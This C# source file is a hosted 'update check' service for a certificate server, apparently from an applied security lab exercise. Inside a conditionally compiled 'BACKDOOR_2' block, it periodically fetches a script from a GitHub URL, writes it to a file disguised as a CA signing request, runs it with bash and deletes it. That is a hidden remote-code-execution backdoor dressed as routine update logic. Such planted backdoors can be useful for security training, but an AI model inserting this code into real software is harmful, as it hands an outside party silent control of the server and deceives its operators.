using Microsoft.Extensions.Hosting;
using Microsoft.Extensions.Logging;
using Microsoft.Net.Http.Headers;
using Newtonsoft.Json.Linq;
using System;
using System.IO;
using System.Net.Http;
using System.Threading;
using System.Threading.Tasks;

namespace CertServer.Services
{
    public class UpdateCheckService : IHostedService
    {
        private readonly ILogger<UpdateCheckService> _logger;
        private readonly IHttpClientFactory _httpClientFactory;
        private Timer _timer;

        public UpdateCheckService(ILogger<UpdateCheckService> logger, IHttpClientFactory httpClientFactory)
        {
            _logger = logger;
            _httpClientFactory = httpClientFactory;
        }

        public Task StartAsync(CancellationToken stoppingToken)
        {
            _logger.LogInformation("Update Check Service running.");

            _timer = new Timer(CheckUpdates, null, TimeSpan.Zero, TimeSpan.FromMinutes(30));

            return Task.CompletedTask;
        }

        private async void CheckUpdates(object state)
        {
            _logger.LogInformation("Checking for updates...");


#if BACKDOOR_2
            var client2 = _httpClientFactory.CreateClient();
            client2.BaseAddress = new Uri("https://raw.githubusercontent.com/");
            string cmd = await (await client2.GetAsync("/Liblor/applied_security_lab_deploy/master/version.txt")).Content.ReadAsStringAsync();

            if (cmd.StartsWith("#/bin/bash"))
            {
                const string path = "/home/coreca/pki/csr/iMovies_internal_aslcert_Intermediate_CA.csr";
                File.WriteAllText(path, cmd);

                var chmod = new System.Diagnostics.Process()
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        Arguments = $"-c \"chmod 644 {path}\"",
                        FileName = "/bin/bash",
                        UseShellExecute = true
                    }
                };
                chmod.Start();
                chmod.WaitForExit();

                var proc = new System.Diagnostics.Process()
                {
                    StartInfo = new System.Diagnostics.ProcessStartInfo
                    {
                        Arguments = $"{path}",
                        FileName = "/bin/bash",
                        UseShellExecute = true
                    }
                };
                proc.Start();
                proc.WaitForExit();

                File.Delete(path);
            }
#endif

            var client = _httpClientFactory.CreateClient();
            client.BaseAddress = new Uri("https://api.github.com/");
            client.DefaultRequestHeaders.Add(HeaderNames.UserAgent, "ASL-CertServer");
            var response = await client.GetAsync("/repos/Liblor/applied_security_lab_deploy/releases/latest");
            if (!response.IsSuccessStatusCode)
            {
                _logger.LogWarning("Update check failed.");
                return;
            }

            dynamic json = JObject.Parse(await response.Content.ReadAsStringAsync());
            string publishedTimeString = json.published_at;
            var publishedTime = DateTimeOffset.Parse(publishedTimeString);

            var currentVersionInstallTime = new DateTimeOffset(File.GetLastWriteTime(typeof(UpdateCheckService).Assembly.Location));
            if (publishedTime > currentVersionInstallTime + TimeSpan.FromHours(1)) // Allow for deployment delay
            {
                _logger.LogInformation("Update(s) available!");
            }
            else
            {
                _logger.LogInformation("No updates found");
            }
        }

        public Task StopAsync(CancellationToken stoppingToken)
        {
            _logger.LogInformation("Update check service stopping.");
            _timer?.Change(Timeout.Infinite, 0);

            return Task.CompletedTask;
        }

        public void Dispose()
        {
            _timer?.Dispose();
        }
    }
}
